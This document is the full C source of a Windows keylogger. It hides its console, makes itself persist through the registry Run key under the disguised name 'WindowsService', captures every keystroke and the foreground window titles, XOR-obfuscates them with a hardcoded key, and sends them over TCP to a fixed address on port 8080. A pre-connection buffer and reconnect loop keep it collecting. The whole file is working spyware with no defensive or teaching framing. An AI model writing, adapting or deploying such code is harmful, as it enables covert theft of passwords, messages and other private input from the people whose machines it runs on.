#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define SERVER_IP "172.16.154.110"
#define SERVER_PORT 8080
#define RECONNECT_DELAY 10000
#define SERVICE_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"
#define MAX_BUFFER 1024
#define LOG_FILE "keystrokes.log"

// Global buffer for storing keystrokes before connection
char keystroke_buffer[MAX_BUFFER * 10] = {0}; // Larger buffer for pre-connection logs
size_t buffer_position = 0;

void HideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

void xor_encrypt(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

SOCKET connect_to_server() {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return INVALID_SOCKET;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

void send_window_title(SOCKET sock) {
    char title[256];
    HWND foreground = GetForegroundWindow();

    if (foreground) {
        GetWindowText(foreground, title, sizeof(title));

        static char last_title[256] = "";
        if (strcmp(last_title, title) != 0) {
            char buffer[512];
            sprintf(buffer, "\n[Window: %s]\n", title);
            
            xor_encrypt(buffer);
            send(sock, buffer, strlen(buffer), 0);
            
            strcpy(last_title, title);
        }
    }
}

void install_persistence() {
    char path[MAX_PATH];
    HMODULE hModule = GetModuleHandle(NULL);
    GetModuleFileName(hModule, path, MAX_PATH);

    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
        RegCloseKey(hKey);
    }
}

void save_to_buffer(const char *data) {
    size_t data_len = strlen(data);
    if (buffer_position + data_len < sizeof(keystroke_buffer) - 1) {
        strcat(keystroke_buffer + buffer_position, data);
        buffer_position += data_len;
    }
}

void send_buffered_keystrokes(SOCKET sock) {
    if (buffer_position > 0) {
        // Add header to indicate buffered data
        char header[50];
        sprintf(header, "\n[Buffered data from before connection]\n");
        xor_encrypt(header);
        send(sock, header, strlen(header), 0);
        
        // Send the actual buffered data in chunks
        char *ptr = keystroke_buffer;
        size_t remaining = buffer_position;
        
        while (remaining > 0) {
            size_t chunk_size = (remaining > MAX_BUFFER) ? MAX_BUFFER : remaining;
            char temp_chunk[MAX_BUFFER + 1] = {0};
            strncpy(temp_chunk, ptr, chunk_size);
            
            xor_encrypt(temp_chunk);
            send(sock, temp_chunk, strlen(temp_chunk), 0);
            
            ptr += chunk_size;
            remaining -= chunk_size;
        }
        
        // Clear the buffer after sending
        memset(keystroke_buffer, 0, sizeof(keystroke_buffer));
        buffer_position = 0;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsoleWindow();
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
    install_persistence();

    SOCKET sock;
    static bool key_states[256] = {0};

    while (1) {
        // First collect keystrokes without connection
        for (int i = 0; i < 100; i++) { // Check keys for a while before attempting connection
            for (int key = 8; key <= 190; key++) {
                if ((GetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                    char key_str[20] = {0};

                    if (key >= 65 && key <= 90) {
                        sprintf(key_str, "%c", key + 32);
                    } else if (key >= 48 && key <= 57) {
                        sprintf(key_str, "%c", key);
                    } else {
                        switch (key) {
                            case VK_SPACE: strcpy(key_str, " "); break;
                            case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                            case VK_TAB: strcpy(key_str, "[TAB]"); break;
                            case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                            case VK_BACK: strcpy(key_str, "\b"); break;
                            case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                            case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                            case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                            case VK_MENU: strcpy(key_str, "[ALT]"); break;
                            case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                            case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                            case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                            case VK_HOME: strcpy(key_str, "[HOME]"); break;
                            case VK_END: strcpy(key_str, "[END]"); break;
                            case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                            case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                            case VK_UP: strcpy(key_str, "[UP]"); break;
                            case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                            case VK_OEM_1: strcpy(key_str, ";"); break;
                            case VK_OEM_7: strcpy(key_str, "'"); break;
                            case VK_OEM_COMMA: strcpy(key_str, ","); break;
                            case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                            case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                            case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                            case VK_OEM_2: strcpy(key_str, "/"); break;
                            case VK_OEM_3: strcpy(key_str, "`"); break;
                            case VK_OEM_4: strcpy(key_str, "["); break;
                            case VK_OEM_5: strcpy(key_str, "\\"); break;
                            case VK_OEM_6: strcpy(key_str, "]"); break;
                            default: continue;
                        }
                    }
                    
                    save_to_buffer(key_str);
                    key_states[key] = true;
                }
                if (!(GetAsyncKeyState(key) & 0x8000)) {
                    key_states[key] = false;
                }
            }
            Sleep(10);
        }

        // Now attempt connection
        sock = connect_to_server();
        
        if (sock != INVALID_SOCKET) {
            // Send any buffered keystrokes first
            send_buffered_keystrokes(sock);
            
            while (1) {
                send_window_title(sock);

                for (int key = 8; key <= 190; key++) {
                    if ((GetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                        char key_str[20] = {0};

                        if (key >= 65 && key <= 90) {
                            sprintf(key_str, "%c", key + 32);
                        } else if (key >= 48 && key <= 57) {
                            sprintf(key_str, "%c", key);
                        } else {
                            switch (key) {
                                case VK_SPACE: strcpy(key_str, " "); break;
                                case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                                case VK_TAB: strcpy(key_str, "[TAB]"); break;
                                case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                                case VK_BACK: strcpy(key_str, "\b"); break;
                                case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                                case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                                case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                                case VK_MENU: strcpy(key_str, "[ALT]"); break;
                                case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                                case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                                case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                                case VK_HOME: strcpy(key_str, "[HOME]"); break;
                                case VK_END: strcpy(key_str, "[END]"); break;
                                case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                                case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                                case VK_UP: strcpy(key_str, "[UP]"); break;
                                case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                                case VK_OEM_1: strcpy(key_str, ";"); break;
                                case VK_OEM_7: strcpy(key_str, "'"); break;
                                case VK_OEM_COMMA: strcpy(key_str, ","); break;
                                case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                                case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                                case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                                case VK_OEM_2: strcpy(key_str, "/"); break;
                                case VK_OEM_3: strcpy(key_str, "`"); break;
                                case VK_OEM_4: strcpy(key_str, "["); break;
                                case VK_OEM_5: strcpy(key_str, "\\"); break;
                                case VK_OEM_6: strcpy(key_str, "]"); break;
                                default: continue;
                            }
                        }

                        xor_encrypt(key_str);
                        if (send(sock, key_str, strlen(key_str), 0) == SOCKET_ERROR) {
                            closesocket(sock);
                            WSACleanup();
                            sock = INVALID_SOCKET;
                            break;
                        }

                        key_states[key] = true;
                    }
                    if (!(GetAsyncKeyState(key) & 0x8000)) {
                        key_states[key] = false;
                    }
                }
                
                if (sock == INVALID_SOCKET) {
                    break;
                }
                
                Sleep(10);
            }
        }

        Sleep(RECONNECT_DELAY);
    }

    return 0;
}